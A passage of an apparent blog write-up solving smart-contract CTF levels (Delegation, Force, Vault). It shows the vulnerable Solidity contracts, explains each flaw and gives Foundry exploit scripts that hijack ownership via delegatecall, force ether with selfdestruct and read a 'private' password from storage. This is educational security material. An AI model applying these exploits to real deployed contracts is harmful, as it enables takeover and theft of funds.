</span><span>    console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;MY balance:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>level5</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envAddress</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;MY_ADDRESS&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level5Solution.s.sol:Level5Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Delegation</h2>
<p><strong>Level6.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">//objective:</span><span>
</span><span></span><span class="token" style="color:#6a9955">//claim ownership</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Delegate</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _owner</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> _owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">pwn</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Delegation</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  Delegate delegate</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _delegateAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    delegate </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Delegate</span><span class="token" style="color:#d4d4d4">(</span><span>_delegateAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#dcdcaa">fallback</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> result</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>delegate</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegatecall</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>result</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong>
Claim ownership of Delegation contract</p>
<p><strong>Explanation:</strong></p>
<ol>
<li><code>Delegation</code> contracts uses delegatecall to call the other contract <code>Delegate</code>.</li>
<li>One thing to remember with delegatecall is that it will maintain the <code>msg.sender</code> and <code>msg.value</code> when it calls other contract.</li>
<li>And also it updates the caller contract storage not the contract which being called.</li>
<li>So, when we call <code>pwn()</code> on the Delegation address it will forward the call to Delegate contract and updates the owner variable in Delegation contract.</li>
</ol>
<p><strong>Level6Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level6.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level6Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    Delegation </span><span class="token" style="color:#569CD6">public</span><span> level6 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Delegation</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xCAfBaEb598da2251121AD148766f2a6c4B4C2dB7</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>  </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Initial Owner : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> level6</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">owner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>level6</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">call</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodeWithSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;pwn()&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Final Owner : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> level6</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">owner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level6Solution.s.sol:Level6Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Force</h2>
<p><strong>Level7.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Force</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#6a9955">/*
</span><span class="token" style="color:#6a9955">
</span><span class="token" style="color:#6a9955">                   MEOW ?
</span><span class="token" style="color:#6a9955">         /_/   /
</span><span class="token" style="color:#6a9955">    ____/ o o   /~____  =ø= /
</span><span class="token" style="color:#6a9955"> (______)__m_m)
</span><span class="token" style="color:#6a9955">
</span><span class="token" style="color:#6a9955">*/</span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>We need to make the balance of the Force contract more than 0.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>There is no <code>receive()/fallback()</code> function and no payable functions in the Force contract.</li>
<li>If we send any ether to this contract it will be reverted.</li>
<li>One thing , we can do is that deploy a contract with some ether and implement a <code>selfdestruct</code> function and pass the recepient as the <code>Force</code> contract address.</li>
<li>Upon selfdestruct of the Attack contract, Force contract will receive ether.</li>
</ol>
<p><strong>Level7Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">ToBeDestructed</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> _forceAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">selfdestruct</span><span class="token" style="color:#d4d4d4">(</span><span>_forceAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level7Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">ToBeDestructed</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">1</span><span> wei</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x562488c3a3f2208737b860fF335cfBc3CD306865</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level7Solution.s.sol:Level7Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Vault</h2>
<p><strong>Level8.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Vault</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">bool</span><span> </span><span class="token" style="color:#569CD6">public</span><span> locked</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">bytes32</span><span> </span><span class="token" style="color:#569CD6">private</span><span> password</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes32</span><span> _password</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    locked </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    password </span><span class="token" style="color:#d4d4d4">=</span><span> _password</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">unlock</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes32</span><span> _password</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>password </span><span class="token" style="color:#d4d4d4">==</span><span> _password</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      locked </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>We need to unlock the vault.</p>
<p><strong>Explanation</strong>:</p>
<ol>
<li>We can simply call the <code>unlock()</code> function with password. But the password was not publicly accessible.</li>
<li>Declaring a variable <code>private</code> doesn’t mean that no one can read that variable. Only the other contracts which interacts with it won’t able to view that variable.</li>
<li>We can solve this by two ways, one is using with foundry <code>vm.load</code> and another is using with blockchain explorer(Sepolia Etherscan).</li>
<li>I used <code>vm.load</code>. in foundry.</li>
</ol>
<p><strong>Level8Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level8.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level8Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>     Vault </span><span class="token" style="color:#569CD6">public</span><span> level8 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x826c120B1C2b48fd2ad8C7015BcbfFe33A851E7A</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">bytes32</span><span> password </span><span class="token" style="color:#d4d4d4">=</span><span> vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">load</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>level8</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">logBytes32</span><span class="token" style="color:#d4d4d4">(</span><span>password</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        level8</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">unlock</span><span class="token" style="color:#d4d4d4">(</span><span>password</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level8Solution.s.sol:Level8Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>King</h2>
<p><strong>Level9.sol</strong></p>
